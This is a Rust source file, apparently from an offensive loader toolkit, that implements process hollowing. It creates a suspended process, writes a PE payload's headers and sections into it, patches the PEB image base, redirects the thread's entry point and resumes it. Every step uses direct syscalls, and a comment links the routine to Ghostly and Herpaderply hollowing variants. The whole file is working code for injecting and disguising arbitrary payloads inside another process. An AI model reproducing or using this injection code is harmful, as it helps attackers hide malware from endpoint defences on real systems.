use core::mem::{size_of, zeroed};
use windows_sys::Win32::System::Diagnostics::Debug::CONTEXT;
use windows_sys::Win32::System::Memory::MEM_COMMIT;
use windows_sys::Win32::System::Memory::MEM_RESERVE;
use windows_sys::Win32::System::Memory::PAGE_READWRITE;
use windows_sys::Win32::System::Threading::PROCESS_INFORMATION;

use super::super::{pe_utils::*, process_utils::*};
use crate::log;
use crate::syscall;

// This is a common function for Ghostly, Herpaderply and regular Process Hollowing.
pub unsafe fn hollow_process(
    pi: PROCESS_INFORMATION,
    base_address: usize,
    payload_entry_rva: u32,
) -> bool {
    unsafe {
        log!("Starting hollow_process ...");

        // Step 1: Get Thread Context
        let mut context: CONTEXT = zeroed();
        context.ContextFlags = ntapi::winapi::um::winnt::CONTEXT_FULL;

        let status = syscall!("NtGetContextThread", pi.hThread, &mut context);
        if status < 0 {
            log!("NtGetContextThread failed: 0x{:X}", status);
            terminate(pi.hProcess);
            return false;
        }

        // Step 2: Patch PEB.ImageBaseAddress
        let peb_image_base_ptr = (context.Rdx + 0x10) as *mut usize;
        let mut bytes_written: usize = 0;
        let status = syscall!(
            "NtWriteVirtualMemory",
            pi.hProcess,
            peb_image_base_ptr,
            &base_address as *const usize,
            size_of::<usize>(),
            &mut bytes_written
        );
        if status < 0 {
            log!("Failed to write ImageBase to PEB: 0x{:X}", status);
            terminate(pi.hProcess);
            return false;
        }

        log!("Patched PEB.ImageBaseAddress to: 0x{:X}", base_address);

        // Step 3: Set Entry Point
        context.Rcx = base_address as u64 + payload_entry_rva as u64;
        log!("Entry point address: 0x{:X}", context.Rcx);

        let status = syscall!("NtSetContextThread", pi.hThread, &mut context);
        if status < 0 {
            log!("NtSetContextThread failed: 0x{:X}", status);
            terminate(pi.hProcess);
            return false;
        }

        // Step 4: Resume Thread
        let mut suspend_count = 0;
        let status = syscall!("NtResumeThread", pi.hThread, &mut suspend_count);
        if status < 0 {
            log!("NtResumeThread failed: 0x{:X}", status);
            terminate(pi.hProcess);
            return false;
        }

        log!("Hollowing complete. Thread resumed.");

        true
    }
}

pub unsafe fn process_hollowing(payload: &[u8]) {
    unsafe {
        log!("Starting process hollowing...");

        let pi = create_process(true, false, true).unwrap();
        log!("Created suspended process: PID = {}", pi.dwProcessId);

        let (_, nt) = parse_headers(payload);

        let mut remote_memory: usize = nt.OptionalHeader.ImageBase as usize;
        let mut region_size: usize = nt.OptionalHeader.SizeOfImage as usize;

        let status = syscall!(
            "NtAllocateVirtualMemory",
            pi.hProcess,
            &mut remote_memory as *mut usize,
            0,
            &mut region_size as *mut usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        if status < 0 {
            log!("NtAllocateVirtualMemory failed: 0x{:X}", status);
            terminate(pi.hProcess);
            return;
        }

        log!("Allocated remote memory at: 0x{:X}", remote_memory);

        let mut bytes_written: usize = 0;

        // Write headers
        let status = syscall!(
            "NtWriteVirtualMemory",
            pi.hProcess,
            remote_memory,
            payload.as_ptr(),
            nt.OptionalHeader.SizeOfHeaders as usize,
            &mut bytes_written
        );
        if status < 0 || bytes_written != nt.OptionalHeader.SizeOfHeaders as usize {
            log!(
                "[!] Failed to write PE headers: 0x{:X}. Bytes: 0x{:X}",
                status,
                bytes_written
            );
            terminate(pi.hProcess);
            return;
        }

        // Write sections
        for section in get_section_headers(nt) {
            let section_size = section.SizeOfRawData as usize;
            let section_addr = remote_memory + section.VirtualAddress as usize;
            let section_src = payload.as_ptr().add(section.PointerToRawData as usize);

            let status = syscall!(
                "NtWriteVirtualMemory",
                pi.hProcess,
                section_addr,
                section_src,
                section_size,
                &mut bytes_written
            );

            if status < 0 || bytes_written != section_size {
                log!("Failed to write section: 0x{:X}", status);
                terminate(pi.hProcess);
                return;
            }

            let status = syscall!(
                "NtProtectVirtualMemory",
                pi.hProcess,
                &section_addr,
                &section_size,
                get_section_protection(section.Characteristics),
                &mut bytes_written
            );

            if status < 0 {
                log!("Failed to protect section: 0x{:X}", status);
                terminate(pi.hProcess);
                return;
            }
        }

        if !hollow_process(pi, remote_memory, nt.OptionalHeader.AddressOfEntryPoint) {
            log!("Hollowing process failed.");
            terminate(pi.hProcess);
            return;
        }

        log!("Process hollowing complete. Thread resumed.");
    }
}
